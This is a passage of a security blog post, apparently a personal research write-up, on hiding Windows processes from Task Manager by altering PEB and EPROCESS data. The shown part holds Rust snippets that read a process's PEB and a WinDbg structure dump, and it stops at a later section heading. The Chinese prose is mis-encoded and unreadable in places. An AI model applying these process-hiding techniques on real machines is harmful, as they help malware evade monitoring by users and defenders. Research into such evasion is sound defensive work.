<!DOCTYPE html>
<html lang="en"><head>
<title>Windowsè¿›ç¨‹éšè—åˆæ¢</title>




<meta charset="utf-8">
<meta name="X-UA-Compatible" content="IE=edge">
<meta name="google-site-verification" content="G-XXXXXXXXXX">
<meta content="width=device-width, initial-scale=1.0, maximum-scale=5, user-scalable=5" name="viewport">
<meta content="telephone=no" name="format-detection">
<meta name="description" content="">
<meta name="renderer" content="webkit">
<meta name="theme-color" content="#ffffff">



<meta property="og:url" content="https://military-axe.github.io/post/windows%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E5%88%9D%E6%8E%A2/">
  <meta property="og:site_name" content="Mi1itray.axe">
  <meta property="og:title" content="Windowsè¿›ç¨‹éšè—åˆæ¢">
  <meta property="og:description" content="My HomePage Description">
  <meta property="og:locale" content="en_us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="post">
    <meta property="article:published_time" content="2024-05-30T00:00:00+00:00">
    <meta property="article:modified_time" content="2024-05-30T00:00:00+00:00">
    <meta property="article:tag" content="Windows">
    <meta property="article:tag" content="Hide">
    <meta property="article:tag" content="Driver">
    <meta property="article:tag" content="Hook">






  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Windowsè¿›ç¨‹éšè—åˆæ¢">
  <meta name="twitter:description" content="My HomePage Description">







      <script async src="https://www.googletagmanager.com/gtag/js?id=G-XXXXXXXXXX"></script>
      <script>
        var doNotTrack = false;
        if ( false ) {
          var dnt = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack);
          var doNotTrack = (dnt == "1" || dnt == "yes");
        }
        if (!doNotTrack) {
          window.dataLayer = window.dataLayer || [];
          function gtag(){dataLayer.push(arguments);}
          gtag('js', new Date());
          gtag('config', 'G-XXXXXXXXXX');
        }
      </script>




<script type="text/javascript">
  (function(c,l,a,r,i,t,y){
      c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
      t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
      y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
  })(window, document, "clarity", "script", "abcdefghzd");
</script>



  






      <script src="/js/toc.js"></script>
    
    <link type="text/css" rel="stylesheet" href="/vendor/css/bootstrap.min.css">

<link rel="stylesheet" href="/scss/dark-mode.min.cb53f1bee2b8900cb4f082afbf00175d6618f281cf9a2fe8619e3b52d20b5721.css" integrity="sha256-y1PxvuK4kAy08IKvvwAXXWYY8oHPmi/oYZ47UtILVyE=" media="screen">


<link rel="stylesheet"
          href="https://fonts.googleapis.com/css?family=Material+Icons">



















</head>
<body>
    	<div id="app"><div class="single-column-drawer-container" id="drawer"
     v-bind:class="{ 'single-column-drawer-container-active': isDrawerOpen }">
    <div class="drawer-content">
        <div class="drawer-menu">
            
            
            
                
                
                
                
                
                <a class="a-block drawer-menu-item false" href="/posts">
                    Archive
                </a>
                
            
                
                
                
                
                
                <a class="a-block drawer-menu-item false" href="/categories">
                    Categories
                </a>
                
            
                
                
                
                
                
                <a class="a-block drawer-menu-item false" href="/tags">
                    Tags
                </a>
                
            
                
                
                
                
                
                <a class="a-block drawer-menu-item false" href="/index.xml">
                    RSS Feed
                </a>
                
            
            
            <div class="toc">


	<div class="toc-content">
	
		
		
		
		<center>- CATALOG -</center>
		
		
		<ul>
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#windows%e8%bf%9b%e7%a8%8b%e9%9a%90%e8%97%8f%e5%88%9d%e6%8e%a2" class="nav-windowsè¿›ç¨‹éšè—åˆæ¢">
									Windowsè¿›ç¨‹éšè—åˆæ¢
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
							
								
									<ul>
								
							
						
						
							<li>
								<a href="#r3%e9%9a%90%e8%97%8f%e4%bf%a1%e6%81%af" class="nav-r3éšè—ä¿¡æ¯">
									R3éšè—ä¿¡æ¯
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
							
								
									<ul>
								
							
						
						
							<li>
								<a href="#r3%e4%bc%aa%e9%80%a0%e4%bf%a1%e6%81%af" class="nav-r3ä¼ªé€ ä¿¡æ¯">
									R3ä¼ªé€ ä¿¡æ¯
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#r3%e6%b6%88%e9%99%a4%e8%bf%9b%e7%a8%8b" class="nav-r3æ¶ˆé™¤è¿›ç¨‹">
									R3æ¶ˆé™¤è¿›ç¨‹
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
							
								
									<ul>
								
							
						
						
							<li>
								<a href="#api-hook-hook%e4%bb%bb%e5%8a%a1%e7%ae%a1%e7%90%86%e5%99%a8" class="nav-api-hook-hookä»»åŠ¡ç®¡ç†å™¨">
									[API hook] Hookä»»åŠ¡ç®¡ç†å™¨
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e5%85%a8%e5%b1%80hook-setwindowshookex" class="nav-å…¨å±€hook-setwindowshookex">
									[å…¨å±€hook] SetWindowsHookEx
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e5%85%a8%e5%b1%80hook-hook-explorer" class="nav-å…¨å±€hook-hook-explorer">
									[å…¨å±€hook] Hook Explorer
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
							
								</ul>
							
								</ul>
							
						
						
						
							<li>
								<a href="#r0%e9%9a%90%e8%97%8f%e4%bf%a1%e6%81%af" class="nav-r0éšè—ä¿¡æ¯">
									R0éšè—ä¿¡æ¯
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
							
								
									<ul>
								
							
						
						
							<li>
								<a href="#r0%e4%bc%aa%e9%80%a0%e4%bf%a1%e6%81%af" class="nav-r0ä¼ªé€ ä¿¡æ¯">
									R0ä¼ªé€ ä¿¡æ¯
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#r0%e6%b6%88%e9%99%a4%e8%bf%9b%e7%a8%8b" class="nav-r0æ¶ˆé™¤è¿›ç¨‹">
									R0æ¶ˆé™¤è¿›ç¨‹
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
							
								</ul>
							
								</ul>
							
						
						
						
							<li>
								<a href="#%e6%80%bb%e7%bb%93%e6%80%9d%e8%80%83" class="nav-æ€»ç»“æ€è€ƒ">
									æ€»ç»“æ€è€ƒ
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e5%8f%82%e8%80%83" class="nav-å‚è€ƒ">
									å‚è€ƒ
								</a>
							</li>
						
						
					
				
			
		</ul>
	</div>

</div>
            
        </div>
    </div>
</div>
<transition name="fade">
    <div id="drawer-mask" v-bind:class="{ 'single-column-drawer-mask': mounted }" v-if="isDrawerOpen" v-on:click="toggleDrawer"></div>
</transition>
<nav id="navBar" class="navbar sticky-top navbar-light single-column-nav-container">
    <div id="navBackground" class="nav-background"></div>
    <div class="container container-narrow nav-content">
        <button id="nav_dropdown_btn" class="nav-dropdown-toggle" type="button" v-on:click="toggleDrawer">
            <i class="material-icons">
                menu
            </i>
        </button>
        <a id="navTitle" class="navbar-brand" href="https://military-axe.github.io/">
            Mi1itray.axe
        </a>
        
        <button type="button" class="nav-darkmode-toggle" id="darkModeToggleButton2">
            <i class="material-icons" id="darkModeToggleIcon2">
                dark_mode
            </i>
        </button>
        
    </div>
</nav>
<div class="single-column-header-container" id="pageHead"
     v-bind:style="{ transform: 'translateZ(0px) translateY('+.3*scrollY+'px)', opacity: 1-navOpacity }">
    <a href="https://military-axe.github.io/">
        <div class="single-column-header-title">Mi1itray.axe</div>
        
        <div class="single-column-header-subtitle">mi1itray.axe@gmail.com</div>
        

    </a>
</div>

            <div id="content">
                <div id="streamContainer" class="stream-container">

    <div class="post-list-container post-list-container-shadow">
        <div class="post">
            
            
            

            <div class="post-head-wrapper-text-only"
                
            >
                <div class="post-title">
                    Windowsè¿›ç¨‹éšè—åˆæ¢
                    
                    <div class="post-meta">
                        
                        <time itemprop="datePublished">
                            2024-05-30 00:00
                        </time>
                        

                        
                            <i class="material-icons" style="">folder</i>
                                <a href="/categories/driver">Driver</a>
                                &nbsp;
                        

                        
                            <i class="material-icons" style="">label</i>
                            
                                <a href="/tags/windows">windows</a>
                                &nbsp;
                            
                                <a href="/tags/hide">hide</a>
                                &nbsp;
                            
                                <a href="/tags/driver">driver</a>
                                &nbsp;
                            
                                <a href="/tags/hook">hook</a>
                                &nbsp;
                            
                        
                        
                    </div>
                </div>
            </div>
            
            <div class="post-body-wrapper">
                
                <div class="post-body" v-pre>
                
                    <h1 id="windowsè¿›ç¨‹éšè—åˆæ¢">Windowsè¿›ç¨‹éšè—åˆæ¢</h1>
<p>ç›®çš„æ˜¯å°†æˆ‘ä»¬çš„è¿›ç¨‹ä¿¡æ¯ä¿®æ”¹ï¼Œè®©ä»»åŠ¡ç®¡ç†å™¨è¿™äº›æ— æ³•è¯»å–åˆ°åŸæœ¬çœŸå®çš„ä¿¡æ¯ï¼Œä»è€Œåšåˆ°éšè—æ•ˆæœã€‚æ¯”å¦‚å°†ç›®çš„è¿›ç¨‹ä¿®æ”¹æˆç³»ç»Ÿè¿›ç¨‹ä¿¡æ¯ã€‚</p>
<p>ä¸»è¦ä½¿ç”¨ä¸¤ä¸ªå±‚é¢éšè—</p>
<ul>
<li>
<p>R3çš„PEBä¸­éšè—ä¿¡æ¯</p>
</li>
<li>
<p>R0çš„_EPROCESSä¸­éšè—ä¿¡æ¯ã€‚</p>
</li>
</ul>
<p>éšè—æˆ‘ä»¬ä¹Ÿå¯ä»¥ä»ä¸¤ä¸ªæ–¹é¢æ¥çœ‹ï¼Œä¸€ç§æ˜¯ä¼ªé€ ä¿¡æ¯ï¼Œä¸€ç§æ˜¯æ¶ˆé™¤ä¿¡æ¯ã€‚ä¼ªé€ ä¿¡æ¯æ˜¯æŒ‡å°†ä¸€ä¸ªæŒ‡å®šè¿›ç¨‹ä¼ªé€ æˆå…¶ä»–è¿›ç¨‹ï¼Œæ¶ˆé™¤ä¿¡æ¯æ˜¯æŒ‡è®©ä»»åŠ¡ç®¡ç†å™¨è¿™ç§æ— æ³•è¯»å–åˆ°è¿™ä¸ªè¿›ç¨‹çš„ä¿¡æ¯ã€‚</p>
<h2 id="r3éšè—ä¿¡æ¯">R3éšè—ä¿¡æ¯</h2>
<h3 id="r3ä¼ªé€ ä¿¡æ¯">R3ä¼ªé€ ä¿¡æ¯</h3>
<p>æˆ‘çœ‹ä¸€äº›æ–‡ç« ä¸»è¦éšè—ä¿¡æ¯å¦‚ä¸‹(å®é™…ä¸Šä¸æ­¢ï¼Œä½†æ˜¯æ€è·¯æ˜¯ç±»ä¼¼çš„ï¼Œä½†æ˜¯æˆ‘æµ‹è¯•å‘ç°æ²¡æœ‰ä»€ä¹ˆå®é™…ä¸Šçš„ç”¨å¤„</p>
<ul>
<li>ç¨‹åºåç§°ImageBaseName</li>
<li>å‘½ä»¤è¡Œå‚æ•°CommandLine</li>
<li>ä¿®æ”¹ç”¨æˆ·ç»„</li>
</ul>
<p>æ€è·¯ä¹Ÿå¾ˆç®€å•ï¼Œè·å–PEBç»“æ„ä½“ï¼Œç„¶åä¿®æ”¹å¯¹åº”å­—æ®µçš„å†…å®¹ï¼Œè¿™é‡Œæˆ‘ç”¨Rustæ¥å†™ï¼Œrustè°ƒç”¨windowsåº“å‡½æ•°å¯ä»¥å‚è€ƒæˆ‘ä¹‹å‰å†™çš„<a href="https://military-axe.github.io/posts/rustbian-xie-ji-chong-hookde-fang-shi/">æ–‡ç« </a>ï¼Œè¿™é‡Œåªå†™æ€è·¯å’Œéƒ¨åˆ†ä»£ç ç‰‡æ®µï¼Œå®Œæ•´åœ¨é™„å½•ã€‚</p>
<p>è·å–æœ¬èº«è¿›ç¨‹çš„pebåœ°å€ï¼Œè¿™ä¸ªå¾ˆç®€å•ï¼Œå¤§ğŸ”¥éƒ½çŸ¥é“ï¼Œè¯»å–<code>gs:[60h]</code></p>
<div class="highlight"><pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rust" data-lang="rust"><span style="display:flex;"><span><span style="color:#8b008b;font-weight:bold">unsafe</span><span style="color:#bbb"> </span>{<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span>asm!(<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">        </span><span style="color:#cd5555">&#34;mov {0}, gs:[0x60]&#34;</span>,<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">        </span>inout(reg)<span style="color:#bbb"> </span>ppeb<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span>);<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb"></span>}<span style="color:#bbb">
</span></span></span></code></pre></div><p>å¦‚æœæ˜¯å°†è¿™ä¸ªä»£ç æ”¾åœ¨dllä¸­ï¼Œæ³¨å…¥è¿›å»éœ€è¦ä¼ªè£…çš„è¿›ç¨‹ä¹Ÿå¯ä»¥å®ç°è¯»å–pebçš„æ•ˆæœã€‚ä½†æ˜¯æˆ‘è¿™é‡Œè¿˜æ˜¯åå‘äºä¸ä½¿ç”¨æ³¨å…¥æ‰‹æ®µï¼Œå€¾å‘äºç›´æ¥ä¼ å…¥è¿›ç¨‹pidï¼Œç„¶åè·å–pebï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨<code>ntdll.dll</code>ä¸­æœªå¯¼å‡ºçš„å‡½æ•°<code>NtQueryInformationProcess</code>ã€‚åœ¨rustä¸­å¯ä»¥ç›´æ¥ç”¨ï¼Œc++ä¸­éœ€è¦<code>GetProcAddress(Ntdll, &quot;NtQueryInformationProcess&quot;)</code>æ¥è·å–</p>
<div class="highlight"><pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rust" data-lang="rust"><span style="display:flex;"><span><span style="color:#8b008b;font-weight:bold">fn</span> <span style="color:#008b45">main</span>()<span style="color:#bbb"> </span>{<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span><span style="color:#8b008b;font-weight:bold">let</span><span style="color:#bbb"> </span>handle<span style="color:#bbb"> </span>=<span style="color:#bbb"> </span><span style="color:#8b008b;font-weight:bold">unsafe</span><span style="color:#bbb"> </span>{<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">        </span>OpenProcess(<span style="color:#00688b">PROCESS_QUERY_INFORMATION</span><span style="color:#bbb"> </span>|<span style="color:#bbb"> </span><span style="color:#00688b">PROCESS_VM_READ</span>,<span style="color:#bbb"> </span><span style="color:#8b008b;font-weight:bold">false</span>,<span style="color:#bbb"> </span><span style="color:#b452cd">9676</span>)<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">            </span>.expect(<span style="color:#cd5555">&#34;[!] OpenProcess error&#34;</span>)<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span>};<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span><span style="color:#8b008b;font-weight:bold">let</span><span style="color:#bbb"> </span><span style="color:#8b008b;font-weight:bold">mut</span><span style="color:#bbb"> </span>pbi<span style="color:#bbb"> </span>=<span style="color:#bbb"> </span><span style="color:#00688b">PROCESS_BASIC_INFORMATION</span><span style="color:#bbb"> </span>{<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">        </span>..<span style="color:#658b00">Default</span>::default()<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span>};<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span><span style="color:#8b008b;font-weight:bold">let</span><span style="color:#bbb"> </span>ppbi<span style="color:#bbb"> </span>=<span style="color:#bbb"> </span>&amp;<span style="color:#8b008b;font-weight:bold">mut</span><span style="color:#bbb"> </span>pbi<span style="color:#bbb"> </span><span style="color:#8b008b;font-weight:bold">as</span><span style="color:#bbb"> </span>*<span style="color:#8b008b;font-weight:bold">mut</span><span style="color:#bbb"> </span>_;<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span><span style="color:#8b008b;font-weight:bold">let</span><span style="color:#bbb"> </span><span style="color:#8b008b;font-weight:bold">mut</span><span style="color:#bbb"> </span>return_length<span style="color:#bbb"> </span>=<span style="color:#bbb"> </span><span style="color:#b452cd">0</span><span style="color:#8b008b;font-weight:bold">u32</span>;<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span><span style="color:#8b008b;font-weight:bold">unsafe</span><span style="color:#bbb"> </span>{<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">        </span><span style="color:#8b008b;font-weight:bold">let</span><span style="color:#bbb"> </span>_<span style="color:#bbb"> </span>=<span style="color:#bbb"> </span>NtQueryInformationProcess(<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">            </span>handle,<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">            </span>ProcessBasicInformation,<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">            </span>ppbi<span style="color:#bbb"> </span><span style="color:#8b008b;font-weight:bold">as</span><span style="color:#bbb"> </span>*<span style="color:#8b008b;font-weight:bold">mut</span><span style="color:#bbb"> </span>c_void,<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">            </span>size_of::&lt;<span style="color:#00688b">PROCESS_BASIC_INFORMATION</span>&gt;()<span style="color:#bbb"> </span><span style="color:#8b008b;font-weight:bold">as</span><span style="color:#bbb"> </span><span style="color:#00688b;font-weight:bold">u32</span>,<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">            </span>&amp;<span style="color:#8b008b;font-weight:bold">mut</span><span style="color:#bbb"> </span>return_length,<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">        </span>);<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">        </span>println!(<span style="color:#cd5555">&#34;</span><span style="color:#cd5555">{:#?}</span><span style="color:#cd5555">&#34;</span>,<span style="color:#bbb"> </span>pbi);<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span>};<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb"></span>}<span style="color:#bbb">
</span></span></span></code></pre></div><p>ä½¿ç”¨<code>NtQueryInformationProcess</code>å¯ä»¥å¾—åˆ°<code>PROCESS_BASIC_INFORMATION</code>ç»“æ„ä½“</p>
<div class="highlight"><pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rust" data-lang="rust"><span style="display:flex;"><span><span style="color:#1e889b">#[repr(C)]</span><span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb"></span><span style="color:#8b008b;font-weight:bold">pub</span><span style="color:#bbb"> </span><span style="color:#8b008b;font-weight:bold">struct</span> <span style="color:#008b45;font-weight:bold">PROCESS_BASIC_INFORMATION</span><span style="color:#bbb"> </span>{<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span><span style="color:#8b008b;font-weight:bold">pub</span><span style="color:#bbb"> </span>ExitStatus: <span style="color:#008b45;font-weight:bold">NTSTATUS</span>,<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span><span style="color:#8b008b;font-weight:bold">pub</span><span style="color:#bbb"> </span>PebBaseAddress: *<span style="color:#8b008b;font-weight:bold">mut</span><span style="color:#bbb"> </span><span style="color:#00688b">PEB</span>,<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span><span style="color:#8b008b;font-weight:bold">pub</span><span style="color:#bbb"> </span>AffinityMask: <span style="color:#00688b;font-weight:bold">usize</span>,<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span><span style="color:#8b008b;font-weight:bold">pub</span><span style="color:#bbb"> </span>BasePriority: <span style="color:#00688b;font-weight:bold">i32</span>,<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span><span style="color:#8b008b;font-weight:bold">pub</span><span style="color:#bbb"> </span>UniqueProcessId: <span style="color:#00688b;font-weight:bold">usize</span>,<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span><span style="color:#8b008b;font-weight:bold">pub</span><span style="color:#bbb"> </span>InheritedFromUniqueProcessId: <span style="color:#00688b;font-weight:bold">usize</span>,<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb"></span>}<span style="color:#bbb">
</span></span></span></code></pre></div><p>å¯ä»¥ä»ç»“æ„ä½“ä¸­<code>PROCESS_BASIC_INFORMATION-&gt;PebBaseAddress</code>è·å–pebåœ°å€ã€‚å¸¸è§çš„æ–‡ç« ä¸€èˆ¬æ˜¯ä¿®æ”¹<code>ImageBaseNamed</code>å’Œ<code>CommandLine</code>æ¥éšè—è¿™ä¸¤ä¸ªä¿¡æ¯</p>
<p>ImageBaseNamedå’ŒCommandLineçš„ä½ç½®æŸ¥çœ‹pebç»“æ„ä½“å¯çŸ¥</p>
<ul>
<li><code>Peb-&gt;ProcessParameters-&gt;ImageBaseNamed</code></li>
<li><code>Peb-&gt;ProcessParameters-&gt;CommandLine </code></li>
</ul>
<p>å®é™…ä¸Šéœ€è¦ä¿®æ”¹çš„åœ°æ–¹è¿˜æœ‰å¾ˆå¤šï¼ŒæŸ¥çœ‹<code>Peb-&gt;ProcessParameters</code>å¯ä»¥çœ‹åˆ°</p>
<div class="highlight"><pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#b452cd">0</span>: kd&gt; dt <span style="color:#b452cd">0x0000020c</span><span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">6f</span><span style="color:#b452cd">211</span>de0 _RTL_USER_PROCESS_PARAMETERS
</span></span><span style="display:flex;"><span>nt!_RTL_USER_PROCESS_PARAMETERS
</span></span><span style="display:flex;"><span>   +<span style="color:#b452cd">0x000</span> MaximumLength    : <span style="color:#b452cd">0x764</span>
</span></span><span style="display:flex;"><span>   +<span style="color:#b452cd">0x004</span> Length           : <span style="color:#b452cd">0x764</span>
</span></span><span style="display:flex;"><span>   +<span style="color:#b452cd">0x008</span> Flags            : <span style="color:#b452cd">0x4001</span>
</span></span><span style="display:flex;"><span>   +<span style="color:#b452cd">0x00c</span> DebugFlags       : <span style="color:#b452cd">0</span>
</span></span><span style="display:flex;"><span>   +<span style="color:#b452cd">0x010</span> ConsoleHandle    : <span style="color:#b452cd">0x00000000</span><span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">0000004</span><span style="color:#b452cd">8</span> Void
</span></span><span style="display:flex;"><span>   +<span style="color:#b452cd">0x018</span> ConsoleFlags     : <span style="color:#b452cd">0</span>
</span></span><span style="display:flex;"><span>   +<span style="color:#b452cd">0x020</span> StandardInput    : <span style="color:#b452cd">0x00000000</span><span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">0000005</span>c Void
</span></span><span style="display:flex;"><span>   +<span style="color:#b452cd">0x028</span> StandardOutput   : <span style="color:#b452cd">0x00000000</span><span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">00000060</span> Void
</span></span><span style="display:flex;"><span>   +<span style="color:#b452cd">0x030</span> StandardError    : <span style="color:#b452cd">0x00000000</span><span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">00000064</span> Void
</span></span><span style="display:flex;"><span>   +<span style="color:#b452cd">0x038</span> CurrentDirectory : _CURDIR
</span></span><span style="display:flex;"><span>   +<span style="color:#b452cd">0x050</span> DllPath          : _UNICODE_STRING <span style="color:#cd5555">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>   +<span style="color:#b452cd">0x060</span> ImagePathName    : _UNICODE_STRING <span style="color:#cd5555">&#34;C:\Users</span><span style="color:#cd5555">\a</span><span style="color:#cd5555">xe\Desktop\hide_process_r3.exe&#34;</span>
</span></span><span style="display:flex;"><span>   +<span style="color:#b452cd">0x070</span> CommandLine      : _UNICODE_STRING <span style="color:#cd5555">&#34;&#34;</span>C:<span style="color:#a61717;background-color:#e3d2d2">\</span>Users<span style="color:#a61717;background-color:#e3d2d2">\</span>axe<span style="color:#a61717;background-color:#e3d2d2">\</span>Desktop<span style="color:#a61717;background-color:#e3d2d2">\</span>hide_process_r3.exe<span style="color:#cd5555">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>   +<span style="color:#b452cd">0x080</span> Environment      : <span style="color:#b452cd">0x0000020c</span><span style="color:#a61717;background-color:#e3d2d2">`</span><span style="color:#b452cd">6f210f</span>e0 Void
</span></span><span style="display:flex;"><span>   +<span style="color:#b452cd">0x088</span> StartingX        : <span style="color:#b452cd">0</span>
</span></span><span style="display:flex;"><span>   +<span style="color:#b452cd">0x08c</span> StartingY        : <span style="color:#b452cd">0</span>
</span></span><span style="display:flex;"><span>   +<span style="color:#b452cd">0x090</span> CountX           : <span style="color:#b452cd">0</span>
</span></span><span style="display:flex;"><span>   +<span style="color:#b452cd">0x094</span> CountY           : <span style="color:#b452cd">0</span>
</span></span><span style="display:flex;"><span>   +<span style="color:#b452cd">0x098</span> CountCharsX      : <span style="color:#b452cd">0</span>
</span></span><span style="display:flex;"><span>   +<span style="color:#b452cd">0x09c</span> CountCharsY      : <span style="color:#b452cd">0</span>
</span></span><span style="display:flex;"><span>   +<span style="color:#b452cd">0x0a0</span> FillAttribute    : <span style="color:#b452cd">0</span>
</span></span><span style="display:flex;"><span>   +<span style="color:#b452cd">0x0a4</span> WindowFlags      : <span style="color:#b452cd">0</span>
</span></span><span style="display:flex;"><span>   +<span style="color:#b452cd">0x0a8</span> ShowWindowFlags  : <span style="color:#b452cd">0</span>
</span></span><span style="display:flex;"><span>   +<span style="color:#b452cd">0x0b0</span> WindowTitle      : _UNICODE_STRING <span style="color:#cd5555">&#34;C:\Users</span><span style="color:#cd5555">\a</span><span style="color:#cd5555">xe\Desktop\hide_process_r3.exe&#34;</span>
</span></span><span style="display:flex;"><span>   +<span style="color:#b452cd">0x0c0</span> DesktopInfo      : _UNICODE_STRING <span style="color:#cd5555">&#34;WinSta0\Default&#34;</span>
</span></span><span style="display:flex;"><span>   +<span style="color:#b452cd">0x0d0</span> ShellInfo        : _UNICODE_STRING <span style="color:#cd5555">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>   +<span style="color:#b452cd">0x0e0</span> RuntimeData      : _UNICODE_STRING <span style="color:#cd5555">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>   +<span style="color:#b452cd">0x0f0</span> CurrentDirectores : [<span style="color:#b452cd">32</span>] _RTL_DRIVE_LETTER_CURDIR
</span></span><span style="display:flex;"><span>   +<span style="color:#b452cd">0x3f0</span> EnvironmentSize  : <span style="color:#b452cd">0xdf8</span>
</span></span><span style="display:flex;"><span>   +<span style="color:#b452cd">0x3f8</span> EnvironmentVersion : <span style="color:#b452cd">3</span>
</span></span><span style="display:flex;"><span>   +<span style="color:#b452cd">0x400</span> PackageDependencyData : (null) 
</span></span><span style="display:flex;"><span>   +<span style="color:#b452cd">0x408</span> ProcessGroupId   : <span style="color:#b452cd">0x21c</span>
</span></span><span style="display:flex;"><span>   +<span style="color:#b452cd">0x40c</span> LoaderThreads    : <span style="color:#b452cd">0</span>
</span></span><span style="display:flex;"><span>   +<span style="color:#b452cd">0x410</span> RedirectionDllName : _UNICODE_STRING <span style="color:#cd5555">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>   +<span style="color:#b452cd">0x420</span> HeapPartitionName : _UNICODE_STRING <span style="color:#cd5555">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>   +<span style="color:#b452cd">0x430</span> DefaultThreadpoolCpuSetMasks : (null) 
</span></span><span style="display:flex;"><span>   +<span style="color:#b452cd">0x438</span> DefaultThreadpoolCpuSetMaskCount : <span style="color:#b452cd">0</span>
</span></span><span style="display:flex;"><span>   +<span style="color:#b452cd">0x43c</span> DefaultThreadpoolThreadMaximum : <span style="color:#b452cd">0</span>
</span></span></code></pre></div><p>ä½†æ˜¯æˆ‘å‘ç°ä¿®æ”¹äº†è¿™äº›å­—ç¬¦ä¸²åï¼Œä»»åŠ¡ç®¡ç†å™¨ä¸­ä¾ç„¶æ²¡æœ‰è¢«ä¿®æ”¹ï¼Œè¯´æ˜ä»»åŠ¡ç®¡ç†å™¨è¯»å–çš„å­—ç¬¦ä¸²åº”è¯¥ä¸æ˜¯PEBä¸­çš„ï¼Œå¯èƒ½æ˜¯EPORCESSä¸­çš„(åœ¨R0ä¸­éªŒè¯)ã€‚æ‰€ä»¥æ²¡å•¥ç”¨ã€‚</p>
<p>ä»£ç åœ¨<a href="https://github.com/Military-axe/HideProcessR3">HideProcessR3</a>é¡¹ç›®</p>
<h3 id="r3æ¶ˆé™¤è¿›ç¨‹">R3æ¶ˆé™¤è¿›ç¨‹</h3>
<blockquote>
